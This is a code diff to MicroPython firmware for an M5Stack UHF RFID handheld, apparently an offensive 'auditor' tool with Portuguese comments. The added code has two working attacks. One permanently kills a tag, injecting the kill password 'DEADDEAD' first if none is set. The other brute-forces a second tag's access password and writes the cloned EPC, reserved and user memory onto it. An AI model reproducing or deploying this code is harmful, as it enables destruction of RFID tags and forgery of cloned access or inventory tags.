@@ -164,7 +164,7 @@ def tela_scan_mode():
     tags_encontradas = []
     cursor_index = 0
     
-    ui_header("CYBER AUDITOR v6.3")
+    ui_header("CYBER AUDITOR")
     ui_footer("SCAN", "NEXT", "HACK") 
     desenhar_lista_tags()
     
@@ -241,7 +241,11 @@ def ler_memoria(senha):
 
 def tela_relatorio(dados, sucesso):
     ui_header("DUMP REPORT")
-    ui_footer("", "EXIT", "") 
+    
+    if sucesso:
+        ui_footer("KILL", "EXIT", "CLONE") 
+    else:
+        ui_footer("", "EXIT", "")
     
     status_txt = "ACCESS GRANTED" if sucesso else "RESTRICTED"
     bg_col = C_SUCCESS if sucesso else C_DANGER
@@ -251,7 +255,6 @@ def tela_relatorio(dados, sucesso):
     M5.Lcd.setTextColor(C_BG)
     M5.Lcd.setCursor(60, 45); M5.Lcd.print(status_txt)
     
-    # Subi tudo e diminui espaçamento (Antes 80 -> Agora 75)
     y = 75
     
     def draw_row(l, v, y_pos, color=C_TEXT):
@@ -259,39 +262,93 @@ def tela_relatorio(dados, sucesso):
         M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
         M5.Lcd.setCursor(10, y_pos); M5.Lcd.print(l)
         M5.Lcd.setTextColor(color, C_BG)
-        M5.Lcd.setCursor(110, y_pos); M5.Lcd.print(v[:20])
+        M5.Lcd.setCursor(110, y_pos); M5.Lcd.print(v[:20] if v else "---")
         M5.Lcd.drawLine(10, y_pos+10, 310, y_pos+10, C_PANEL)
 
     chip = identificar_chip(dados["TID"])
     pwd_disp = dados["PWD"] if dados["PWD"] else "OPEN/UNKNOWN"
     
-    # Espaçamento reduzido de 20 para 18 pixels
     draw_row("PASSWORD", pwd_disp, y, C_ACCENT)
     draw_row("CHIP TYPE", chip, y+18, C_SUCCESS)
     draw_row("EPC ID", dados["EPC"], y+36)
     draw_row("TID SERIAL", dados["TID"], y+54)
     
-    # User Memory (Subiu e diminuiu altura)
     M5.Lcd.setTextColor(C_ACCENT, C_BG)
     M5.Lcd.setCursor(10, y+80); M5.Lcd.print("USER MEMORY DUMP:")
     
-    # Caixa Reduzida (30px de altura em vez de 40px)
-    # Termina em y+125, deixando espaço de sobra para o footer (y=210)
     M5.Lcd.drawRect(10, y+95, 300, 30, C_PANEL)
     
     M5.Lcd.setTextColor(C_TEXT, C_BG)
     M5.Lcd.setCursor(15, y+105)
     
-    u_data = dados["USR"]
+    u_data = dados["USR"] if dados["USR"] else ""
     if len(u_data) > 30: M5.Lcd.print(u_data[:28] + "..")
-    else: M5.Lcd.print(u_data)
+    else: M5.Lcd.print(u_data if u_data else "---")
 
     while True:
         M5.update()
         if wdt: wdt.feed()
-        if M5.BtnB.isPressed():
+        
+        # FUNCIONALIDADE 1: KILL TAG
+        if sucesso and M5.BtnA.wasPressed():
+            M5.Speaker.tone(2000, 100)
+            M5.Lcd.fillScreen(C_BG)
+            M5.Lcd.setTextColor(C_DANGER, C_BG)
+            M5.Lcd.setTextSize(2)
+            M5.Lcd.setCursor(60, 100)
+            M5.Lcd.print("KILLING TAG...")
+            
+            travar_na_tag(dados["EPC"])
+            
+            try:
+                access_pwd = dados["PWD"] if dados["PWD"] else "00000000"
+                kill_pwd = "00000000"
+
+                if dados.get("RES") and len(dados["RES"]) >= 8 and dados["RES"] not in ["---", "Erro"]:
+                    kill_pwd = dados["RES"][:8]
+
+                if kill_pwd == "00000000":
+                    M5.Lcd.setTextSize(1)
+                    M5.Lcd.setCursor(30, 130)
+                    M5.Lcd.print("INJECTING KILL PWD...")
+                    
+                    nova_kill_pwd = "DEADDEAD" 
+                    
+                    uhf.write_mem_bank(0, 0, nova_kill_pwd, access_pwd)
+                    time.sleep(0.1)
+                    kill_pwd = nova_kill_pwd
+
+                M5.Lcd.setCursor(30, 150)
+                M5.Lcd.print(f"SENDING KILL: {kill_pwd}")
+                
+                uhf.kill(kill_pwd)
+                
+                time.sleep(1)
+                M5.Lcd.fillScreen(C_BG)
+                M5.Lcd.setTextColor(C_DANGER, C_BG)
+                M5.Lcd.setTextSize(2)
+                M5.Lcd.setCursor(40, 100)
+                M5.Lcd.print("TARGET DESTROYED")
+                M5.Speaker.tone(4000, 500)
+                time.sleep(1.5)
+                
+            except Exception as e:
+                M5.Lcd.setCursor(30, 170)
+                M5.Lcd.print("KILL FAILED!")
+                time.sleep(1.5)
+            
+            break # Volta pro scan
+            
+        if M5.BtnB.wasPressed():
             M5.Speaker.tone(1000, 50)
             break
+            
+        # FUNCIONALIDADE 2: CLONE TAG
+        if sucesso and M5.BtnC.wasPressed():
+            M5.Speaker.tone(1500, 100)
+            tela_clone_scan(dados)
+            return
+            
         time.sleep(0.1)
     tela_scan_mode()
 
@@ -343,8 +400,127 @@ def executar_ataque(epc):
     resetar_filtro()
     tela_relatorio(dados, sucesso=(senha_encontrada is not None))
 
+# --- TELAS E FUNÇÕES CLONAGEM ---
+def tela_clone_scan(dados_origem):
+    global tags_encontradas, cursor_index
+    resetar_filtro() 
+    tags_encontradas = []
+    cursor_index = 0
+    
+    ui_header("CLONE TARGET")
+    ui_footer("SCAN", "NEXT", "CLONE") 
+    desenhar_lista_tags()
+    
+    while True:
+        M5.update()
+        if wdt: wdt.feed()
+        
+        if M5.BtnA.isPressed():
+            M5.Lcd.fillCircle(305, 20, 4, C_ACCENT)
+            try:
+                dados = uhf.inventory()
+                if dados:
+                    epc = str(dados).replace("b'", "").replace("'", "")
+                    if epc not in tags_encontradas and len(epc) > 4 and epc != dados_origem["EPC"]:
+                        tags_encontradas.append(epc)
+                        M5.Speaker.tone(4000, 20)
+                        desenhar_lista_tags()
+            except: pass
+            time.sleep(0.05)
+            M5.Lcd.fillCircle(305, 20, 4, C_HEADER)
+            
+        if M5.BtnB.wasPressed():
+            if tags_encontradas:
+                cursor_index = (cursor_index + 1) % len(tags_encontradas)
+                desenhar_lista_tags()
+                M5.Speaker.tone(1000, 50)
+        
+        if M5.BtnC.wasPressed():
+            if tags_encontradas:
+                alvo = tags_encontradas[cursor_index]
+                M5.Speaker.tone(2000, 100)
+                executar_ataque_clone(alvo, dados_origem)
+                return 
+
+def executar_ataque_clone(epc_alvo, dados_origem):
+    M5.Lcd.fillScreen(C_BG)
+    M5.Lcd.setTextColor(C_ACCENT, C_BG)
+    M5.Lcd.setTextSize(2)
+    M5.Lcd.setCursor(60, 50); M5.Lcd.print("LOCKING TGT...")
+    
+    travar_na_tag(epc_alvo)
+    time.sleep(0.3)
+    
+    ui_header("BRUTE TGT")
+    ui_footer("", "STOP", "")
+    
+    M5.Lcd.setTextSize(1)
+    M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
+    M5.Lcd.setCursor(10, 50); M5.Lcd.print("TARGET EPC:")
+    M5.Lcd.setTextColor(C_TEXT, C_BG)
+    M5.Lcd.setCursor(10, 65); M5.Lcd.print(epc_alvo[:26])
+    
+    senha_alvo = None
+    total = len(KEYS)
+    
+    for i, senha in enumerate(KEYS):
+        if wdt: wdt.feed()
+        atualizar_progresso(i, total, senha)
+        
+        try:
+            if uhf.write_mem_bank(1, 2, epc_alvo, senha):
+                if uhf.read_mem_bank(0, 0, 4, senha):
+                    senha_alvo = senha
+                    break
+        except: pass
+        
+        M5.update()
+        if M5.BtnB.wasPressed(): 
+            resetar_filtro()
+            tela_scan_mode()
+            return
+        time.sleep_ms(15) 
+        
+    M5.Lcd.fillScreen(C_BG)
+    
+    if senha_alvo:
+        M5.Lcd.setTextSize(2)
+        M5.Lcd.setCursor(40, 100)
+        M5.Lcd.setTextColor(C_ACCENT, C_BG)
+        M5.Lcd.print("WRITING CLONE...")
+        
+        if dados_origem["RES"] and dados_origem["RES"] not in ["---", "Erro"]:
+            try: uhf.write_mem_bank(0, 0, dados_origem["RES"], senha_alvo)
+            except: pass
+            time.sleep(0.05)
+            
+        if dados_origem["USR"] and dados_origem["USR"] not in ["---", "Erro"]:
+            try: uhf.write_mem_bank(3, 0, dados_origem["USR"], senha_alvo)
+            except: pass
+            time.sleep(0.05)
+            
+        if dados_origem["EPC"] and dados_origem["EPC"] not in ["---", "Erro"]:
+            try: uhf.write_mem_bank(1, 2, dados_origem["EPC"], senha_alvo)
+            except: pass
+            time.sleep(0.05)
+            
+        M5.Lcd.fillScreen(C_BG)
+        M5.Lcd.setCursor(50, 100)
+        M5.Lcd.setTextColor(C_SUCCESS, C_BG)
+        M5.Lcd.print("CLONE SUCCESS!")
+        time.sleep(2)
+    else:
+        M5.Lcd.setCursor(40, 100)
+        M5.Lcd.setTextColor(C_DANGER, C_BG)
+        M5.Lcd.print("TGT HACK FAILED")
+        time.sleep(2)
+        
+    resetar_filtro()
+    tela_scan_mode()
+
 if __name__ == "__main__":
     try: setup()
     except Exception as e:
         print(e)
         machine.reset()
+
